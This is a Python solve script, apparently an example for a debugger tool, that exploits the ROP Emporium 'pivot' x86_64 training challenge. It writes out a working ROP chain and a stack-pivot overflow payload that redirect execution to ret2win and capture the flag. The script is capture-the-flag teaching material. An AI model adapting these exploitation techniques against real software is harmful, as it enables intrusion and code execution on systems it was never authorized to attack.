"""ROP Emporium pivot on x86_64: leave-based stack pivot to a heap buffer.

pwnme prints the address of a 0x100-byte heap buffer, reads the real chain
into it, then reads 0x40 bytes into the stack frame. The 0x40-byte read
covers rsi+0x00..0x3f, which includes the saved rbp (rsi+0x20) and the saved
rip (rsi+0x28). Setting the saved rbp to the heap buffer and the saved rip
to pwnme's own `leave` makes the second `leave; ret` execute with
rbp = buffer: rsp lands on the chain (its first qword is consumed as the
new rbp). The chain resolves foothold_function's GOT entry (loading
libpivot.so), adds the ret2win delta via `add rax, rbp`, and jumps with
`jmp rax`.

Delivery: the overflow's `leave` stop hits a breakpoint on read@plt (the
challenge's read#1 entry), which is removed before the final resume — the
chain runs to completion in one continue.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_pivot_x64.py
"""

from __future__ import annotations

import re
import struct
import time

from mydbg import symbolic

import emporium

POP_RAX = 0x4009BB        # pop rax; ret
MOV_RAX_M_RAX = 0x4009C0  # mov rax, [rax]; ret
ADD_RAX_RBP = 0x4009C4    # add rax, rbp; ret
JMP_RAX = 0x4007C1        # jmp rax
POP_RBP_RET = 0x4007C8    # 5d c3 (pop rbp; ret)
LEAVE = 0x4009A6          # the pwnme's leave (reused as the pivot gadget)
FOOTHOLD_PLT = 0x400720
FOOTHOLD_GOT = 0x601040
READ_PLT = 0x400710       # the shared read@plt (breakpoint for both reads)


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    binary = emporium.challenge_path("x64", "pivot")
    library = emporium.challenge_path("x64", "libpivot.so")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    lp = symbolic._entry_project(dbg, binary=library)  # noqa: SLF001

    lo = lp.loader.main_object
    foothold, ret2win = None, None
    for symbol in lo.symbols:
        if symbol.name == "foothold_function":
            foothold = symbol.relative_addr
        elif symbol.name == "ret2win":
            ret2win = symbol.relative_addr
    if foothold is None or ret2win is None:
        raise RuntimeError("libpivot symbols not found")
    delta = ret2win - foothold
    print(f"[+] foothold {foothold:#x}, ret2win {ret2win:#x}, delta {delta:#x}")

    # The heap chain: the first qword becomes rbp (consumed by the second
    # leave), then foothold@plt resolves the GOT, and rax = GOT + delta.
    chain = (struct.pack("<Q", 0) +
             struct.pack("<Q", FOOTHOLD_PLT) +
             struct.pack("<Q", POP_RAX) +
             struct.pack("<Q", FOOTHOLD_GOT) +
             struct.pack("<Q", MOV_RAX_M_RAX) +
             struct.pack("<Q", POP_RBP_RET) +
             struct.pack("<Q", delta) +
             struct.pack("<Q", ADD_RAX_RBP) +
             struct.pack("<Q", JMP_RAX))

    # The 0x40-byte frame overflow: 32 buf1 + saved rbp = buffer +
    # saved rip = leave (pivot).
    def overflow(buffer_address: int) -> bytes:
        return (b"A" * 32 +
                struct.pack("<Q", buffer_address) +
                struct.pack("<Q", LEAVE) +
                b"B" * 16)

    process = emporium.qemu_connect(dbg, "x64", binary)  # no payload: reads block
    dbg.set_breakpoint(f"{READ_PLT:#x}")
    result = dbg.continue_and_wait(timeout=15)
    snap = dbg.snapshot()
    if snap.pc != READ_PLT:
        raise RuntimeError(f"the read#1 stop missed (pc: {snap.pc:#x})")
    # read#1 (into the heap buffer) is pending; the pivot address was
    # printed before it.
    output = emporium.drain(process, seconds=3.0)
    match = re.search(rb"place to pivot: (0x[0-9a-f]+)", output)
    if not match:
        raise RuntimeError(f"pivot address not found in: {output[-300:]!r}")
    buffer_address = int(match.group(1), 16)
    print(f"[+] pivot buffer at {buffer_address:#x}")

    process.send(chain, timeout=10)
    time.sleep(0.5)
    result = dbg.continue_and_wait(timeout=15)
    snap = dbg.snapshot()
    if snap.pc != READ_PLT:
        raise RuntimeError(f"the read#2 stop missed (pc: {snap.pc:#x})")
    for bp in dbg.list_breakpoints():
        if f"{READ_PLT:#x}" in bp.description:
            dbg.remove_breakpoint(bp.id)
    process.send(overflow(buffer_address), timeout=10)
    time.sleep(0.5)
    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=6.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "ROPE{" in line]
    if not printed:
        raise RuntimeError(f"pivot chain failed: {output[-200:]!r}")
    print("[+] pivot-x64-solve-ok:", printed[-1])
